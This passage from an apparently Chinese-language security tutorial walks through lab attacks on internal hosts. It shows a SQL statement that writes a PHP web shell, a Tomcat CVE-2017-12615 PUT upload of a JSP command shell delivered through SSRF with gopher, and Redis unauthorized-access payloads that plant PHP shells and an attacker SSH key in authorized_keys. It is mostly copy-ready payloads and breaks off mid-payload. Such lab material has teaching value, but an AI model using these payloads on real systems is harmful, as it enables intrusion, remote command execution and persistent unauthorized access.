class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&quot; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/var/www/html/cmd.php&#x27;</span>;<br><br># 如果是宝塔搭建的<br><span class="hljs-keyword">select</span> &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&quot; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/www/wwwroot/cmd.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424000628991.png" alt="image-20250424000628991"></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424000850842.png" alt="image-20250424000850842"></p><p>执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://172.250.250.1/cmd.php?cmd=<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424001000102.png" alt="image-20250424001000102"></p><h2 id="使用SSRF对tomcat文件写入"><a href="#使用SSRF对tomcat文件写入" class="headerlink" title="使用SSRF对tomcat文件写入"></a>使用SSRF对tomcat文件写入</h2><p>tomcat漏洞：CVE-2017-12615</p><p>这个漏洞的作用是任意文件上传，绕过验证直接在目标靶机进行文件上传</p><p>默认端口是8080</p><h3 id="要构造的POC"><a href="#要构造的POC" class="headerlink" title="要构造的POC"></a>要构造的POC</h3><p>头部信息</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424002709598.png" alt="image-20250424002709598"></p><p>然后构造一句话木马填充到头部信息后</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424002759890.png" alt="image-20250424002759890"></p><p>将以上两部分合并后进行URL编码提交</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/cmd.jsp/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.7:8080<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>460<br><br><span class="language-gradle">&lt;%</span><br><span class="language-gradle">String command = request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);</span><br><span class="language-gradle"><span class="hljs-keyword">if</span>(command != <span class="hljs-keyword">null</span>)</span><br><span class="language-gradle">&#123;</span><br><span class="language-gradle">java.io.InputStream in=<span class="hljs-keyword">Runtime</span>.getRuntime().exec(command).getInputStream();</span><br><span class="language-gradle"><span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;</span><br><span class="language-gradle"><span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];</span><br><span class="language-gradle">out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="language-gradle"><span class="hljs-keyword">while</span>((a=in.<span class="hljs-keyword">read</span>(b))!=-<span class="hljs-number">1</span>)</span><br><span class="language-gradle">&#123;</span><br><span class="language-gradle">out.<span class="hljs-keyword">println</span>(<span class="hljs-keyword">new</span> String(b));</span><br><span class="language-gradle">&#125;</span><br><span class="language-gradle">out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="language-gradle">&#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-gradle">out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;format: xxx.jsp?cmd=Command&quot;</span>);</span><br><span class="language-gradle">&#125;</span><br><span class="language-gradle">%&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.7:8080</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424002953081.png" alt="image-20250424002953081"></p><p>先提交<code>gopher</code>伪协议进行抓包</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//172.250.250.7:8080/_</span><br></code></pre></td></tr></table></figure><p>加入POC，进行两次URL编码</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424004605165.png" alt="image-20250424004605165"></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424004643567.png" alt="image-20250424004643567"></p><p>访问看看</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.7:8080/cmd.jsp</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424004720696.png" alt="image-20250424004720696"></p><p>可以看到成功了，可以执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://172.250.250.7:8080/cmd.jsp?cmd=<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424004843016.png" alt="image-20250424004843016"></p><h2 id="使用SSRF对Redis漏洞未授权操作"><a href="#使用SSRF对Redis漏洞未授权操作" class="headerlink" title="使用SSRF对Redis漏洞未授权操作"></a>使用SSRF对Redis漏洞未授权操作</h2><h3 id="使用SSRF对Redis未授权Webshell写入"><a href="#使用SSRF对Redis未授权Webshell写入" class="headerlink" title="使用SSRF对Redis未授权Webshell写入"></a>使用SSRF对Redis未授权<code>Webshell</code>写入</h3><p>如果对方服务器上有一个网站，可以使用Redis未授权，向对方网站的根目录下写入一个一句话木马，从而拿到对方的<code>Webshell</code></p><h4 id="利用逻辑"><a href="#利用逻辑" class="headerlink" title="利用逻辑"></a>利用逻辑</h4><p>通过备份<code>dbfilename</code>这个文件，将备份文件放在<code>/var/www/html/</code>这个路径下，并设置文件名为<code>phpinfo.php</code>，同时备份的数据写入<code>&lt;?php phpinfo();?&gt;</code>，最后保存退出</p><ul><li><strong>设置Web路径</strong></li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">config <span class="hljs-keyword">set</span> dir /var/<span class="hljs-comment">www</span>/html/<br></code></pre></td></tr></table></figure><ul><li><strong>设置shell文件名</strong></li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">config set dbfilename phpinfo.php<br></code></pre></td></tr></table></figure><ul><li><strong>像数据库插入payload</strong></li></ul><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">set payload &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure><ul><li><strong>保存<code>Webshell</code></strong></li></ul><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">save</span><br></code></pre></td></tr></table></figure><h4 id="本地抓包构造"><a href="#本地抓包构造" class="headerlink" title="本地抓包构造"></a>本地抓包构造</h4><p>抓包</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">tcpdump -i <span class="hljs-keyword">br-容器ID </span>tcp <span class="hljs-keyword">and </span>port <span class="hljs-number">6379</span> -w redis.pcapng<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424145417317.png" alt="image-20250424145417317"></p><p>用Redis-cli登录到主机内</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">redis</span>-cli -h <span class="hljs-number">172.250.250.9</span><br></code></pre></td></tr></table></figure><p>设置路径到网站的根目录</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">config <span class="hljs-keyword">set</span> dir /var/<span class="hljs-comment">www</span>/html/<br></code></pre></td></tr></table></figure><p>设置Web路径</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">config <span class="hljs-keyword">set</span> dir /var/<span class="hljs-comment">www</span>/html/<br></code></pre></td></tr></table></figure><p>设置shell文件名</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">config set dbfilename info.php<br></code></pre></td></tr></table></figure><p>像数据库插入payload</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">set payload &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure><p>保存<code>Webshell</code></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">save</span><br></code></pre></td></tr></table></figure><p>最后退出</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424145835373.png" alt="image-20250424145835373"></p><p>现在就拿到了完整的数据包，可以在根目录查看</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424150105087.png" alt="image-20250424150105087"></p><p>将抓到的包用Wireshark打开</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424150311486.png" alt="image-20250424150311486"></p><p>筛选器筛选出红色的部分</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424150432270.png" alt="image-20250424150432270"></p><p>将数据复制出来，这是第一个命令的参数</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424151303007.png" alt="image-20250424151303007"></p><p>构造payload时上面三行可删去</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424151340968.png" alt="image-20250424151340968"></p><p>最后加上quit，payload如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-number">*4</span><br><span class="hljs-variable">$6</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">CONFIG</span><br><span class="hljs-built_in"></span><span class="hljs-variable">$3</span><br><span class="hljs-built_in">SET</span><br><span class="hljs-variable">$3</span><br>dir<br><span class="hljs-variable">$14</span><br>/var/www/html<br><span class="hljs-number">*4</span><br><span class="hljs-variable">$6</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config</span><br><span class="hljs-built_in"></span><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$10</span><br>dbfilename<br><span class="hljs-variable">$8</span><br>info.php<br><span class="hljs-number">*3</span><br><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$7</span><br>payload<br><span class="hljs-variable">$19</span><br>&lt;?php phpinfo(); ?&gt;<br><span class="hljs-number">*1</span><br><span class="hljs-variable">$4</span><br>save<br><span class="hljs-number">*1</span><br><span class="hljs-variable">$4</span><br>quit<br></code></pre></td></tr></table></figure><p>首先使用<code>dict</code>伪协议检查网站的Redis是否在运行</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">dict:</span><span class="hljs-comment">//172.250.250.9:6379/info</span><br></code></pre></td></tr></table></figure><p>如果是未授权的就会弹出一堆信息</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424152302727.png" alt="image-20250424152302727"></p><p>如果是要授权的就会弹出认证失败的信息</p><p>构造<code>gopher</code>伪协议的payload，首先将payload的换行符换成<code>%0d%0a</code>，问号换成<code>%3f</code></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424152643088.png" alt="image-20250424152643088"></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">*<span class="hljs-number">4</span>%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$14%0d%0a/var/www/html%0d%0a*<span class="hljs-number">4</span>%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$8%0d%0ainfo.php%0d%0a*<span class="hljs-number">3</span>%0d%0a$3%0d%0aset%0d%0a$7%0d%0apayload%0d%0a$19%0d%0a&lt;%3fphp phpinfo(); %3f&gt;%0d%0a*<span class="hljs-number">1</span>%0d%0a$4%0d%0asave%0d%0a*<span class="hljs-number">1</span>%0d%0a$4%0d%0aquit<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.9:6379</span>/_*<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aCONFIG%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aSET%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>adir%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">14</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a/var/www/html%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aconfig%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">10</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>adbfilename%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">8</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>ainfo.php%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">7</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>apayload%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">19</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a&lt;%<span class="hljs-number">3</span>fphp phpinfo(); %<span class="hljs-number">3</span>f&gt;%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>asave%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aquit<br></code></pre></td></tr></table></figure><p>提交</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424152948552.png" alt="image-20250424152948552"></p><p>然后就可以使用<code>http</code>伪协议访问</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.9/info.php</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424153547262.png" alt="image-20250424153547262"></p><h4 id="使用工具构造"><a href="#使用工具构造" class="headerlink" title="使用工具构造"></a>使用工具构造</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 gopherus<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--exploit</span> redis<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424153958769.png" alt="image-20250424153958769"></p><p>有两个选项，第一个是反弹shell，第二个是PHP命令交互，这里选择第二个</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">PHPShell</span><br></code></pre></td></tr></table></figure><p>网站根目录是否是<code>/var/www/html</code>，是就直接回车</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424154144576.png" alt="image-20250424154144576"></p><p>然后是构造的payload，可以直接回车用默认的</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424154225610.png" alt="image-20250424154225610"></p><p>会生成一个<code>shell.php</code>页面，GET方法提交<code>cmd</code>参数执行命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.9:6379</span>/_%<span class="hljs-number">2</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">248</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aflushall%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A3%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">241</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2434</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">20</span>system%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>cmd%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A4%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adir%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2413</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A/var/www/html%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A4%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2410</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adbfilename%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">249</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Ashell.php%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">244</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Asave%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424154505121.png" alt="image-20250424154505121"></p><p>执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://172.250.250.9/shell.php?cmd=<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424154606727.png" alt="image-20250424154606727"></p><h3 id="使用SSRF对Redis未授权SSH公钥写入"><a href="#使用SSRF对Redis未授权SSH公钥写入" class="headerlink" title="使用SSRF对Redis未授权SSH公钥写入"></a>使用SSRF对Redis未授权SSH公钥写入</h3><p>如果对方主机开启了SSH，可以尝试写入SSH公钥文件，用自己的私钥去连接，从而进行SSH登录</p><h4 id="在kali上生成私钥对"><a href="#在kali上生成私钥对" class="headerlink" title="在kali上生成私钥对"></a>在kali上生成私钥对</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure><p>会生成在<code>root</code>目录下的<code>.ssh</code>中，默认敲回车</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424161301409.png" alt="image-20250424161301409"></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424161410956.png" alt="image-20250424161410956"></p><p>第一个是私钥，第二个是公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> id_rsa.pub<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424161513308.png" alt="image-20250424161513308"></p><p>对之前的payload进行修改，要修改文件路径、文件名、文件内容，注意在构造payload时在前后都加上两个换行符，使其之后与其他内容进行区分开</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-number">*4</span><br><span class="hljs-variable">$6</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">CONFIG</span><br><span class="hljs-built_in"></span><span class="hljs-variable">$3</span><br><span class="hljs-built_in">SET</span><br><span class="hljs-variable">$3</span><br>dir<br><span class="hljs-variable">$11</span><br>/root/.ssh/<br><span class="hljs-number">*4</span><br><span class="hljs-variable">$6</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config</span><br><span class="hljs-built_in"></span><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$10</span><br>dbfilename<br><span class="hljs-variable">$15</span><br>authorized_keys<br><span class="hljs-number">*3</span><br><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$7</span><br>payload<br><span class="hljs-variable">$568</span><br><br><br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCQgMRihDD5ALaOUoOBI+T2rKAGvtRQiC4MP73sCskU2JaTD41pRx999mAE4bkzoRRU5bK4FnOHKWrmxXo8FIaMu4E/iSF8H00yQvr9zO6369hqj6yfNLP3cmd6f/o6ouzlcxo2YO1oxaGPZDfd8geqFSmX7YjYS3Tpok7HvmaoV49B06f+2l35oH79SQ5RYujrC3m4TcjT0OpaIKDyB5HTod2MfyUMIsiOKQIIMuMftfpgXWSn7Q03XZEXe+0f/EluByC5HGN0rfi4uzOfCKyhsDzElWTW7MDiJ1tSLpvjaeTJihWUwYKMq8n+rw4on2c5Xu6wxa2fu6pXtFY2b+r4kiyPNhb6h00OukEK3ezNx4UZRecQ0vmDRcwBj+16UbXCs3pGHFpqabraNP04GZZr9+/pPPHUSHKSRlstoc77EmzeKaVg9m5n44LRUAgvkC0aQZak6z+flM8KKuLX58AsBRv73EBKy5goiF2UBYQba9LvFBYz3JjqtrX1GtwwmLM= root@kali<br><br><br><span class="hljs-number">*1</span><br><span class="hljs-variable">$4</span><br>save<br><span class="hljs-number">*1</span><br><span class="hljs-variable">$4</span><br>quit<br></code></pre></td></tr></table></figure><p>替换换行符</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">*<span class="hljs-number">4</span>%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*<span class="hljs-number">4</span>%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*<span class="hljs-number">3</span>%0d%0a$3%0d%0aset%0d%0a$7%0d%0apayload%0d%0a$568%0d%0a%0d%0a%0d%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCQgMRihDD5ALaOUoOBI+T2rKAGvtRQiC4MP73sCskU2JaTD41pRx999mAE4bkzoRRU5bK4FnOHKWrmxXo8FIaMu4E/iSF8H00yQvr9zO6369hqj6yfNLP3cmd6f/o6ouzlcxo2YO1oxaGPZDfd8geqFSmX7YjYS3Tpok7HvmaoV49B06f+<span class="hljs-number">2</span>l35oH79SQ5RYujrC3m4TcjT0OpaIKDyB5HTod2MfyUMIsiOKQIIMuMftfpgXWSn7Q03XZEXe+<span 